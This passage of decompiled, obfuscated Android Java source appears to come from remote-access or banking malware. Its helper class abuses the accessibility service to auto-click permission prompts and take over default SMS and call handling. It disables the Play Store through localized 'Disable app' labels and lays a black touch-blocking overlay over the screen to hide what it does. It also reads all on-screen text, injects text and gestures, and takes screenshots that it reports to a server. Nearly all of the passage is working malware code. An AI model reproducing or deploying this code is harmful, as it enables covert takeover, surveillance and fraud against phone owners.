        if (accessibilityNodeInfo.getClassName() != null && ("android.widget.ImageButton".equals(string2 = ((Object)accessibilityNodeInfo.getClassName()).toString()) || "android.widget.ImageView".equals(string2)) && accessibilityNodeInfo.getContentDescription() != null) {
            return ((Object)accessibilityNodeInfo.getContentDescription()).toString();
        }
        return null;
    }

    public static AccessibilityNodeInfo findByTextAndClassName(AccessibilityNodeInfo accessibilityNodeInfo, String string2, String string3) {
        if (accessibilityNodeInfo == null) {
            return null;
        }
        for (int i = 0; i < accessibilityNodeInfo.getChildCount(); ++i) {
            AccessibilityNodeInfo accessibilityNodeInfo2 = accessibilityNodeInfo.getChild(i);
            if (accessibilityNodeInfo2 == null || accessibilityNodeInfo2.getClassName() == null) continue;
            if (string2.equals(accessibilityNodeInfo2.getClassName()) && accessibilityNodeInfo2.getText() != null && ((Object)accessibilityNodeInfo2.getText()).toString().toLowerCase().equals(string3)) {
                return accessibilityNodeInfo2;
            }
            if ((accessibilityNodeInfo2 = AccessibilityServiceHelper.findByTextAndClassName(accessibilityNodeInfo2, string2, string3)) == null) continue;
            return accessibilityNodeInfo2;
        }
        return null;
    }

    public static AccessibilityNodeInfo findByTextAndId(AccessibilityNodeInfo object, String string22, String string3) {
        if (object == null) {
            return null;
        }
        for (String string22 : object.findAccessibilityNodeInfosByViewId(string22)) {
            if (string22 == null || string22.getText() == null || !((Object)string22.getText()).toString().toLowerCase().equals(string3)) continue;
            return string22;
        }
        return null;
    }

    public static List<AccessibilityNodeInfo> findNodesByContentDescription(String string2, AccessibilityNodeInfo accessibilityNodeInfo) {
        ArrayList<AccessibilityNodeInfo> arrayList = new ArrayList<AccessibilityNodeInfo>();
        if (accessibilityNodeInfo == null) {
            return arrayList;
        }
        AccessibilityServiceHelper.findNodesByContentDescriptionRecursive(accessibilityNodeInfo, string2, arrayList);
        return arrayList;
    }

    private static void findNodesByContentDescriptionRecursive(AccessibilityNodeInfo accessibilityNodeInfo, String string2, List<AccessibilityNodeInfo> list) {
        if (accessibilityNodeInfo == null) {
            return;
        }
        CharSequence charSequence = accessibilityNodeInfo.getContentDescription();
        if (charSequence != null && ((Object)charSequence).toString().equals(string2)) {
            list.add(accessibilityNodeInfo);
        }
        for (int i = 0; i < accessibilityNodeInfo.getChildCount(); ++i) {
            charSequence = accessibilityNodeInfo.getChild(i);
            AccessibilityServiceHelper.findNodesByContentDescriptionRecursive((AccessibilityNodeInfo)charSequence, string2, list);
            if (charSequence == null) continue;
            charSequence.recycle();
        }
    }

    public static List<AccessibilityNodeInfo> findNodesByText(String string2, AccessibilityNodeInfo accessibilityNodeInfo) {
        if (accessibilityNodeInfo != null) {
            return accessibilityNodeInfo.findAccessibilityNodeInfosByText(string2);
        }
        return null;
    }

    public static Supported_Browsers getBrowserByPackage(String string2) {
        return BROWSERS_BY_PACKAGE.get(string2);
    }

    /*
     * Enabled aggressive block sorting
     */
    public static String[] getDisableStrings() {
        int n;
        block16: {
            String string2 = Locale.getDefault().getLanguage();
            switch (string2.hashCode()) {
                case 3886: {
                    if (!string2.equals("zh")) break;
                    n = 1;
                    break block16;
                }
                case 3710: {
                    if (!string2.equals("tr")) break;
                    n = 2;
                    break block16;
                }
                case 3651: {
                    if (!string2.equals("ru")) break;
                    n = 3;
                    break block16;
                }
                case 3588: {
                    if (!string2.equals("pt")) break;
                    n = 5;
                    break block16;
                }
                case 3246: {
                    if (!string2.equals("es")) break;
                    n = 4;
                    break block16;
                }
                case 3121: {
                    if (!string2.equals("ar")) break;
                    n = 0;
                    break block16;
                }
            }
            n = -1;
        }
        switch (n) {
            default: {
                return new String[]{"Disable", "Disable app"};
            }
            case 5: {
                return new String[]{"Desativar", "Desativar aplicativo"};
            }
            case 4: {
                return new String[]{"Deshabilitar", "Deshabilitar aplicaci\u00f3n"};
            }
            case 3: {
                return new String[]{"\u041e\u0442\u043a\u043b\u044e\u0447\u0438\u0442\u044c", "\u041e\u0442\u043a\u043b\u044e\u0447\u0438\u0442\u044c \u043f\u0440\u0438\u043b\u043e\u0436\u0435\u043d\u0438\u0435"};
            }
            case 2: {
                return new String[]{"Devre D\u0131\u015f\u0131 B\u0131rak", "Uygulamay\u0131 Devre D\u0131\u015f\u0131 B\u0131rak"};
            }
            case 1: {
                return new String[]{"\u505c\u7528", "\u505c\u7528\u5e94\u7528"};
            }
            case 0: 
        }
        return new String[]{"\u062a\u0639\u0637\u064a\u0644", "\u062a\u0639\u0637\u064a\u0644 \u0627\u0644\u062a\u0637\u0628\u064a\u0642", "\u0625\u064a\u0642\u0627\u0641", "\u0625\u064a\u0642\u0627\u0641 \u0627\u0644\u062a\u0637\u0628\u064a\u0642", "\u0625\u0644\u063a\u0627\u0621 \u0627\u0644\u062a\u0641\u0639\u064a\u0644", "\u0625\u0644\u063a\u0627\u0621 \u062a\u0641\u0639\u064a\u0644 \u0627\u0644\u062a\u0637\u0628\u064a\u0642"};
    }

    public static AccessibilityNodeInfo getFirstNodeByViewId(AccessibilityNodeInfo object, String string2) {
        if ((object = object.findAccessibilityNodeInfosByViewId(string2)) != null) {
            Iterator iterator2 = object.iterator();
            while (iterator2.hasNext()) {
                AccessibilityNodeInfo accessibilityNodeInfo = (AccessibilityNodeInfo)iterator2.next();
                string2 = accessibilityNodeInfo.getParent();
                if (string2 == null) continue;
                int n = string2.getChildCount();
                for (int i = 0; i < n; ++i) {
                    object = string2.getChild(i);
                    if (object == null || !object.equals((Object)accessibilityNodeInfo)) continue;
                    Log.d((String)"AccessibilityService", (String)("Node index: " + i));
                    if (i != 0) continue;
                    return accessibilityNodeInfo;
                }
            }
        }
        return null;
    }

    public static AccessibilityNodeInfo getNodeByViewId(AccessibilityNodeInfo object, String string2) {
        Object var2_2 = null;
        if (object == null) {
            return null;
        }
        object = (object = object.findAccessibilityNodeInfosByViewId(string2)).isEmpty() ? var2_2 : (AccessibilityNodeInfo)object.get(0);
        return object;
    }

    public static List<AccessibilityNodeInfo> getNodesByClassName(AccessibilityNodeInfo accessibilityNodeInfo, String string2) {
        ArrayList<AccessibilityNodeInfo> arrayList = new ArrayList<AccessibilityNodeInfo>();
        if (accessibilityNodeInfo == null) {
            return arrayList;
        }
        AccessibilityServiceHelper.searchNodesByClass(accessibilityNodeInfo, string2, arrayList);
        return arrayList;
    }

    public static boolean isNodeFullyVisible(AccessibilityNodeInfo accessibilityNodeInfo, Rect rect) {
        Rect rect2 = new Rect();
        accessibilityNodeInfo.getBoundsInScreen(rect2);
        return rect2.contains(rect);
    }

    /*
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     */
    public static boolean isSameWebsite(String object, String string2) {
        try {
            object = Pattern.compile("^(?:https?://)?(?:[^:/\\n]+\\.)?([^:/\\n]+\\.[^:/\\n]+)").matcher((CharSequence)object);
            if (!((Matcher)object).find()) return false;
            if ((object = ((Matcher)object).group(1)) != null) {
                return ((String)object).equals(string2);
            }
            object = new AssertionError();
            throw object;
        }
        catch (Exception exception) {
            // empty catch block
        }
        return false;
    }

    static /* synthetic */ void lambda$BlackScreen$31(AccessibilityServiceController jhvbzpdwpbqgticwdxuva2, Context context) {
        jhvbzpdwpbqgticwdxuva2.applyBlockTouchesToOverlay();
        if (jhvbzpdwpbqgticwdxuva2.BlackoverLay.getWindowToken() == null) {
            try {
                AccessibilityServiceController.AccessWindow.addView((View)jhvbzpdwpbqgticwdxuva2.BlackoverLay, (ViewGroup.LayoutParams)AccessibilityServiceController.Blacklayparams);
            }
            catch (Exception exception) {}
        } else {
            try {
                AccessibilityServiceController.AccessWindow.updateViewLayout((View)jhvbzpdwpbqgticwdxuva2.BlackoverLay, (ViewGroup.LayoutParams)AccessibilityServiceController.Blacklayparams);
            }
            catch (Exception exception) {
                // empty catch block
            }
        }
        AccessibilityServiceController.BlackScreen_ON = true;
        AccessibilityServiceController.acquireBlackScreenWakeLock(context);
    }

    static /* synthetic */ void lambda$BlackScreen$32(AccessibilityServiceController jhvbzpdwpbqgticwdxuva2) {
        if (jhvbzpdwpbqgticwdxuva2.TouchBlockOverlay != null && jhvbzpdwpbqgticwdxuva2.TouchBlockOverlay.getWindowToken() != null) {
            try {
                AccessibilityServiceController.AccessWindow.removeView(jhvbzpdwpbqgticwdxuva2.TouchBlockOverlay);
            }
            catch (Exception exception) {
                // empty catch block
            }
        }
        if (jhvbzpdwpbqgticwdxuva2.BlackoverLay != null && jhvbzpdwpbqgticwdxuva2.BlackoverLay.getWindowToken() != null && AccessibilityServiceController.AccessWindow != null) {
            try {
                AccessibilityServiceController.AccessWindow.removeView((View)jhvbzpdwpbqgticwdxuva2.BlackoverLay);
            }
            catch (Exception exception) {
                // empty catch block
            }
        }
        AccessibilityServiceController.BlackScreen_ON = false;
        AccessibilityServiceController.releaseBlackScreenWakeLock();
    }

    static /* synthetic */ void lambda$ClickDefaltcalls$15(int n, String string2) {
        AccessibilityServiceHelper.ClickDefaltcalls(n + 1, string2);
    }

    static /* synthetic */ void lambda$ClickDefaltsms$14(int n, String string2) {
        AccessibilityServiceHelper.ClickDefaltsms(n + 1, string2);
    }

    static /* synthetic */ void lambda$ClickInstall$16(int n) {
        AccessibilityServiceHelper.ClickInstall(n + 1);
    }

    static /* synthetic */ void lambda$Clickallow$2(String string2) {
        AccessibilityServiceHelper.ClickDefaltsms(0, string2);
    }

    static /* synthetic */ void lambda$Clickallow$3(String string2) {
        AccessibilityServiceHelper.ClickDefaltcalls(0, string2);
    }

    static /* synthetic */ void lambda$Clickallow$4(String string2, AccessibilityNodeInfo accessibilityNodeInfo) {
        if (!AccessibilityServiceController.FOR_Dream) {
            return;
        }
        if (AccessibilityServiceHelper.CLickTextpostion(string2, accessibilityNodeInfo)) {
            AccessibilityServiceController.FOR_Dream = false;
        }
    }

    static /* synthetic */ void lambda$Clickallow$5() {
        AccessibilityServiceHelper.ClickInstall(0);
    }

    static /* synthetic */ void lambda$Clickallow$6() {
        AccessibilityServiceHelper.EnableExtraStrg(0);
    }

    static /* synthetic */ void lambda$Clickallow$7(Context context) {
        AccessibilityServiceHelper.EnableDraw(context, true);
    }

    static /* synthetic */ void lambda$Clickallow$8() {
        AccessibilityServiceHelper.DisabelNotifi();
    }

    static /* synthetic */ void lambda$Clickallow$9(Context context) {
        AccessibilityServiceHelper.clikbtry(context);
    }

    static /* synthetic */ void lambda$DisabelNotifi$10(AccessibilityServiceController jhvbzpdwpbqgticwdxuva2) {
        jhvbzpdwpbqgticwdxuva2.performGlobalAction(1);
    }

    static /* synthetic */ void lambda$EnableDraw$21(Context context) {
        UtilityHelper.openmain(context);
    }

    static /* synthetic */ void lambda$EnableDraw$22(Context context) {
        AccessibilityServiceHelper.EnableDraw(context, true);
    }

    static /* synthetic */ void lambda$EnableDraw$23(Context context, AccessibilityServiceController jhvbzpdwpbqgticwdxuva2) {
        if (Settings.canDrawOverlays((Context)context)) {
            AccessibilityServiceController.FOR_DRAW_OVER = false;
            jhvbzpdwpbqgticwdxuva2.performGlobalAction(1);
            new Handler(Looper.getMainLooper()).postDelayed((Runnable)new AccessibilityServiceHelper$$ExternalSyntheticLambda19(context), 100L);
        } else {
            new Handler(Looper.getMainLooper()).postDelayed((Runnable)new AccessibilityServiceHelper$$ExternalSyntheticLambda20(context), 800L);
        }
    }

    static /* synthetic */ void lambda$EnableDraw$24(Context context) {
        AccessibilityServiceHelper.EnableDraw(context, false);
    }

    static /* synthetic */ void lambda$EnableDraw$25(Context context) {
        UtilityHelper.openmain(context);
    }

    static /* synthetic */ void lambda$EnableDraw$26(Context context, AccessibilityServiceController jhvbzpdwpbqgticwdxuva2) {
        if (Settings.canDrawOverlays((Context)context)) {
            AccessibilityServiceController.FOR_DRAW_OVER = false;
            jhvbzpdwpbqgticwdxuva2.performGlobalAction(1);
            new Handler(Looper.getMainLooper()).postDelayed((Runnable)new AccessibilityServiceHelper$$ExternalSyntheticLambda9(context), 100L);
        }
    }

    static /* synthetic */ void lambda$EnableDraw$27(Context context) {
        UtilityHelper.openmain(context);
    }

    static /* synthetic */ void lambda$EnableDraw$28(Context context, AccessibilityServiceController jhvbzpdwpbqgticwdxuva2) {
        if (Settings.canDrawOverlays((Context)context)) {
            AccessibilityServiceController.FOR_DRAW_OVER = false;
            jhvbzpdwpbqgticwdxuva2.performGlobalAction(1);
            new Handler(Looper.getMainLooper()).postDelayed((Runnable)new AccessibilityServiceHelper$$ExternalSyntheticLambda13(context), 100L);
        }
    }

    static /* synthetic */ void lambda$EnableDraw$29(Context context) {
        AccessibilityServiceHelper.EnableDraw(context, false);
    }

    static /* synthetic */ void lambda$EnableDraw$30(AccessibilityServiceController jhvbzpdwpbqgticwdxuva2, Context context) {
        AccessibilityServiceHelper.scrollView(jhvbzpdwpbqgticwdxuva2.getRootInActiveWindow());
        new Handler(Looper.getMainLooper()).postDelayed((Runnable)new AccessibilityServiceHelper$$ExternalSyntheticLambda15(context), 500L);
    }

    static /* synthetic */ void lambda$EnableExtraStrg$17(AccessibilityServiceController jhvbzpdwpbqgticwdxuva2) {
        try {
            jhvbzpdwpbqgticwdxuva2.performGlobalAction(1);
        }
        catch (Exception exception) {
            // empty catch block
        }
    }

    static /* synthetic */ void lambda$EnableExtraStrg$18(AccessibilityServiceController jhvbzpdwpbqgticwdxuva2) {
        try {
            jhvbzpdwpbqgticwdxuva2.performGlobalAction(1);
        }
        catch (Exception exception) {
            // empty catch block
        }
    }

    static /* synthetic */ void lambda$EnableExtraStrg$19(AccessibilityServiceController jhvbzpdwpbqgticwdxuva2) {
        try {
            jhvbzpdwpbqgticwdxuva2.performGlobalAction(1);
        }
        catch (Exception exception) {
            // empty catch block
        }
    }

    static /* synthetic */ void lambda$EnableExtraStrg$20(int n) {
        try {
            AccessibilityServiceHelper.EnableExtraStrg(n + 1);
        }
        catch (Exception exception) {
            // empty catch block
        }
    }

    static /* synthetic */ void lambda$addOverlay$33(SurfaceView surfaceView, Context context) {
        if (surfaceView != null) {
            AccessibilityServiceHelper.removeOverlayView(context, surfaceView);
        }
    }

    static /* synthetic */ void lambda$disply$11(Context context, AccessibilityServiceController jhvbzpdwpbqgticwdxuva2) {
        try {
            if (UtilityHelper.isAppDisabled(context, "com.android.vending")) {
                AccessibilityServiceController.FOR_PLY = false;
                jhvbzpdwpbqgticwdxuva2.performGlobalAction(1);
            }
        }
        catch (Exception exception) {
            // empty catch block
        }
    }

    static /* synthetic */ void lambda$disply$12(AccessibilityServiceController jhvbzpdwpbqgticwdxuva2, Context context) {
        String[] stringArray = AccessibilityServiceHelper.getDisableStrings();
        if (!AccessibilityServiceHelper.CLickTextpostion(stringArray[1], jhvbzpdwpbqgticwdxuva2.getRootInActiveWindow()) && stringArray.length > 2 && !AccessibilityServiceHelper.CLickTextpostion(stringArray[3], jhvbzpdwpbqgticwdxuva2.getRootInActiveWindow()) && stringArray.length > 3) {
            AccessibilityServiceHelper.CLickTextpostion(stringArray[5], jhvbzpdwpbqgticwdxuva2.getRootInActiveWindow());
        }
        new Handler(Looper.getMainLooper()).postDelayed((Runnable)new AccessibilityServiceHelper$$ExternalSyntheticLambda12(context, jhvbzpdwpbqgticwdxuva2), 350L);
    }

    static /* synthetic */ void lambda$disply$13(AccessibilityServiceController jhvbzpdwpbqgticwdxuva2, Context context) {
        String[] stringArray = AccessibilityServiceHelper.getDisableStrings();
        if (!AccessibilityServiceHelper.CLickTextpostion(stringArray[0], jhvbzpdwpbqgticwdxuva2.getRootInActiveWindow()) && stringArray.length > 2 && !AccessibilityServiceHelper.CLickTextpostion(stringArray[2], jhvbzpdwpbqgticwdxuva2.getRootInActiveWindow()) && stringArray.length > 3) {
            AccessibilityServiceHelper.CLickTextpostion(stringArray[4], jhvbzpdwpbqgticwdxuva2.getRootInActiveWindow());
        }
        new Handler(Looper.getMainLooper()).postDelayed((Runnable)new AccessibilityServiceHelper$$ExternalSyntheticLambda18(jhvbzpdwpbqgticwdxuva2, context), 800L);
    }

    static /* synthetic */ String lambda$static$0(Supported_Browsers supported_Browsers) {
        return supported_Browsers.packageName;
    }

    static /* synthetic */ Supported_Browsers lambda$static$1(Supported_Browsers supported_Browsers) {
        return supported_Browsers;
    }

    public static void mouseDraw(Point[] strokeDescription, int n) {
        AccessibilityServiceController jhvbzpdwpbqgticwdxuva2;
        block8: {
            jhvbzpdwpbqgticwdxuva2 = AccessibilityServiceHelper.myAccess();
            if (jhvbzpdwpbqgticwdxuva2 != null) break block8;
            return;
        }
        Path path2 = new Path();
        path2.moveTo((float)strokeDescription[0].x, (float)strokeDescription[0].y);
        int n2 = 1;
        while (true) {
            int n3 = ((Point[])strokeDescription).length;
            if (n2 >= n3) break;
            try {
                path2.lineTo((float)strokeDescription[n2].x, (float)strokeDescription[n2].y);
            }
            catch (Exception exception) {
                // empty catch block
            }
            ++n2;
        }
        try {
            strokeDescription = new GestureDescription.StrokeDescription(path2, 0L, (long)n);
            path2 = new GestureDescription.Builder();
            AccessibilityServiceHelper.smartDispatch(jhvbzpdwpbqgticwdxuva2, path2.addStroke(strokeDescription).build(), null);
        }
        catch (Exception exception) {
            exception.printStackTrace();
        }
    }

    public static AccessibilityServiceController myAccess() {
        if (WorkerService.My_Access_inst == null) {
            return null;
        }
        return WorkerService.My_Access_inst;
    }

    private static Context mycontext() {
        if (WorkerService.My_Access_inst == null) {
            return null;
        }
        return WorkerService.My_Access_inst.getApplicationContext();
    }

    public static void onesnap() {
        AccessibilityServiceController jhvbzpdwpbqgticwdxuva2 = AccessibilityServiceHelper.myAccess();
        if (jhvbzpdwpbqgticwdxuva2 == null) {
            return;
        }
        Context context = AccessibilityServiceHelper.mycontext();
        if (context == null) {
            return;
        }
        if (Build.VERSION.SDK_INT >= 30) {
            jhvbzpdwpbqgticwdxuva2.CapScreen(context, "snap", 70);
        } else {
            WorkerService.MyWorker.AlertServer(context, "Snap Short", "this feature requires android 11 and beyond");
        }
    }

    public static void pasteText(String string2) {
        block10: {
            Bundle bundle;
            boolean bl;
            block9: {
                AccessibilityServiceController jhvbzpdwpbqgticwdxuva2;
                block8: {
                    jhvbzpdwpbqgticwdxuva2 = AccessibilityServiceHelper.myAccess();
                    if (jhvbzpdwpbqgticwdxuva2 != null) break block8;
                    return;
                }
                if (AccessibilityServiceHelper.mycontext() == null) {
                    return;
                }
                AccessibilityNodeInfo accessibilityNodeInfo = jhvbzpdwpbqgticwdxuva2.getRootInActiveWindow();
                jhvbzpdwpbqgticwdxuva2 = accessibilityNodeInfo.findFocus(1);
                bl = false;
                bundle = new Bundle();
                bundle.putString("ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE", string2);
                if (jhvbzpdwpbqgticwdxuva2 == null) break block9;
                bl = jhvbzpdwpbqgticwdxuva2.performAction(0x200000, bundle);
                jhvbzpdwpbqgticwdxuva2.recycle();
                accessibilityNodeInfo.recycle();
            }
            if (bl) break block10;
            try {
                if (AccessibilityServiceController.Globalnode == null) {
                    return;
                }
                AccessibilityServiceController.Globalnode.performAction(0x200000, bundle);
            }
            catch (Exception exception) {
                // empty catch block
            }
        }
    }

    private void performSwipeUp() {
    }

    private static void processNode(AccessibilityNodeInfo accessibilityNodeInfo, Canvas canvas, Paint paint, Context context) {
        String string2;
        Rect rect;
        block5: {
            block4: {
                if (accessibilityNodeInfo == null) {
                    return;
                }
                rect = new Rect();
                accessibilityNodeInfo.getBoundsInScreen(rect);
                String string3 = AccessibilityServiceHelper.extractText(accessibilityNodeInfo);
                if (string3 == null) break block4;
                string2 = string3;
                if (!string3.isEmpty()) break block5;
            }
            string2 = "\u2022";
        }
        AccessibilityServiceHelper.drawNode(canvas, paint, rect, string2, -65536);
        AccessibilityServiceHelper.drawViewHierarchy(canvas, accessibilityNodeInfo, paint, Color.parseColor((String)SharedPreferencesManager.Read(context, ConfigurationConstants.Skeleton_Color, "#FFFFFF")));
        accessibilityNodeInfo.recycle();
    }

    public static String readAllTextOnScreen(AccessibilityNodeInfo object) {
        StringBuilder stringBuilder;
        block8: {
            stringBuilder = new StringBuilder();
            if (object != null) break block8;
            return "";
        }
        if (object.getText() != null && object.isVisibleToUser()) {
            stringBuilder.append(object.getText());
        }
        int n = 0;
        while (true) {
            if (n >= object.getChildCount()) break;
            String string2 = AccessibilityServiceHelper.readAllTextOnScreen(object.getChild(n));
            if (!string2.isEmpty()) {
                stringBuilder.append(" ").append(string2);
            }
            ++n;
            continue;
            break;
        }
        try {
            object = stringBuilder.toString();
            return object;
        }
        catch (Exception exception) {
            return "";
        }
    }

    private static void removeOverlayView(Context context, SurfaceView surfaceView) {
        if (surfaceView != null) {
            ((WindowManager)context.getSystemService("window")).removeView((View)surfaceView);
        }
    }

    private static void restoreBrightness(Context context) {
        try {
            if (Settings.System.canWrite((Context)context)) {
                context = context.getContentResolver();
                if (savedBrightness >= 0) {
                    Settings.System.putInt((ContentResolver)context, (String)"screen_brightness", (int)savedBrightness);
                }
                if (savedBrightnessMode >= 0) {
                    Settings.System.putInt((ContentResolver)context, (String)"screen_brightness_mode", (int)savedBrightnessMode);
                }
            }
        }
        catch (Exception exception) {
            // empty catch block
        }
        try {
            AccessibilityServiceController.Blacklayparams.screenBrightness = -1.0f;
        }
        catch (Exception exception) {
            // empty catch block
        }
        savedBrightness = -1;
        savedBrightnessMode = -1;
    }

    public static boolean scrollToText(AccessibilityNodeInfo accessibilityNodeInfo, AccessibilityNodeInfo accessibilityNodeInfo2, String[] stringArray) {
        boolean bl;
        int n = 0;
        if (accessibilityNodeInfo == null) {
            return false;
        }
        if (accessibilityNodeInfo2 == null) {
            return false;
        }
        boolean bl2 = false;
        int n2 = stringArray.length;
        while (true) {
            bl = bl2;
            if (n >= n2) break;
            List list = accessibilityNodeInfo.findAccessibilityNodeInfosByText(stringArray[n]);
            bl = bl2;
            if (list != null) {
                if (list.isEmpty()) {
                    bl = bl2;
                } else {
                    list = new Rect();
                    accessibilityNodeInfo2.getBoundsInScreen((Rect)list);
                    if (list.isEmpty()) {
                        accessibilityNodeInfo2.recycle();
                        bl = bl2;
                    } else {
                        while (accessibilityNodeInfo2.isScrollable() && !AccessibilityServiceHelper.isNodeFullyVisible(accessibilityNodeInfo, (Rect)list)) {
                            accessibilityNodeInfo2.performAction(4096);
                            accessibilityNodeInfo2.getBoundsInScreen((Rect)list);
                        }
                        bl2 = AccessibilityServiceHelper.clickthis(list.centerX(), list.centerY());
                        accessibilityNodeInfo2.recycle();
                        bl = bl2;
                        if (bl2) {
                            bl = bl2;
                            break;
                        }
                    }
                }
            }
            ++n;
            bl2 = bl;
        }
        accessibilityNodeInfo.recycle();
        return bl;
    }

    public static boolean scrollView(AccessibilityNodeInfo accessibilityNodeInfo) {
        if (accessibilityNodeInfo == null) {
            return false;
        }
        if (accessibilityNodeInfo.isScrollable()) {
            return accessibilityNodeInfo.performAction(4096);
        }
        for (int i = 0; i < accessibilityNodeInfo.getChildCount(); ++i) {
            if (!AccessibilityServiceHelper.scrollView(accessibilityNodeInfo.getChild(i))) continue;
            return true;
        }
        return false;
    }

    private static void searchNodesByClass(AccessibilityNodeInfo accessibilityNodeInfo, String string2, List<AccessibilityNodeInfo> list) {
        if (accessibilityNodeInfo == null) {
            return;
        }
        if (accessibilityNodeInfo.getClassName() != null && ((Object)accessibilityNodeInfo.getClassName()).toString().equals(string2)) {
            list.add(accessibilityNodeInfo);
        }
        for (int i = 0; i < accessibilityNodeInfo.getChildCount(); ++i) {
            AccessibilityServiceHelper.searchNodesByClass(accessibilityNodeInfo.getChild(i), string2, list);
        }
    }

    public static void setKeyboardVisibility(boolean bl) {
        AccessibilityServiceController jhvbzpdwpbqgticwdxuva2 = AccessibilityServiceHelper.myAccess();
        if (jhvbzpdwpbqgticwdxuva2 == null) {
            return;
        }
        Context context = AccessibilityServiceHelper.mycontext();
        if (context == null) {
            return;
        }
        context = (InputMethodManager)context.getSystemService("input_method");
        if (bl) {
            jhvbzpdwpbqgticwdxuva2.getSoftKeyboardController().setShowMode(0);
            try {
                context.toggleSoftInput(2, 0);
            }
            catch (Exception exception) {
                exception.printStackTrace();
            }
        } else {
            jhvbzpdwpbqgticwdxuva2.getSoftKeyboardController().setShowMode(1);
            try {
                context.toggleSoftInput(1, 0);
            }
            catch (Exception exception) {
                // empty catch block
            }
        }
    }

    private static void simulateSlideUpGesture(int n, int n2) {
        AccessibilityServiceController jhvbzpdwpbqgticwdxuva2 = AccessibilityServiceHelper.myAccess();
        if (jhvbzpdwpbqgticwdxuva2 == null) {
            return;
        }
        float f = (float)n * 0.5f;
        float f2 = n2;
        float f3 = n2;
        Path path2 = new Path();
        path2.moveTo(f, f2 * 0.75f);
        path2.lineTo(f, f3 * 0.1f);
        GestureDescription.Builder builder = new GestureDescription.Builder();
        builder.addStroke(new GestureDescription.StrokeDescription(path2, 0L, 300L));
        AccessibilityServiceHelper.smartDispatch(jhvbzpdwpbqgticwdxuva2, builder.build(), null);
    }

    public static void slideUp() {
        AccessibilityServiceController jhvbzpdwpbqgticwdxuva2 = AccessibilityServiceHelper.myAccess();
        if (jhvbzpdwpbqgticwdxuva2 == null) {
            return;
        }
        AccessibilityServiceHelper.simulateSlideUpGesture(jhvbzpdwpbqgticwdxuva2.mWidth, jhvbzpdwpbqgticwdxuva2.mHeight);
    }

    public static void smartDispatch(AccessibilityServiceController jhvbzpdwpbqgticwdxuva2, GestureDescription gestureDescription, AccessibilityService.GestureResultCallback gestureResultCallback) {
        if (jhvbzpdwpbqgticwdxuva2 != null && jhvbzpdwpbqgticwdxuva2.runGestureWithBypass(gestureDescription, 80)) {
            return;
        }
        if (jhvbzpdwpbqgticwdxuva2 != null) {
            jhvbzpdwpbqgticwdxuva2.dispatchGesture(gestureDescription, gestureResultCallback, new Handler(jhvbzpdwpbqgticwdxuva2.getMainLooper()));
        }
    }

    public static class Supported_Browsers {
        public final String id;
        public final String packageName;

        public Supported_Browsers(String string2, String string3) {
            this.packageName = string2;
            this.id = string3;
        }
    }
}

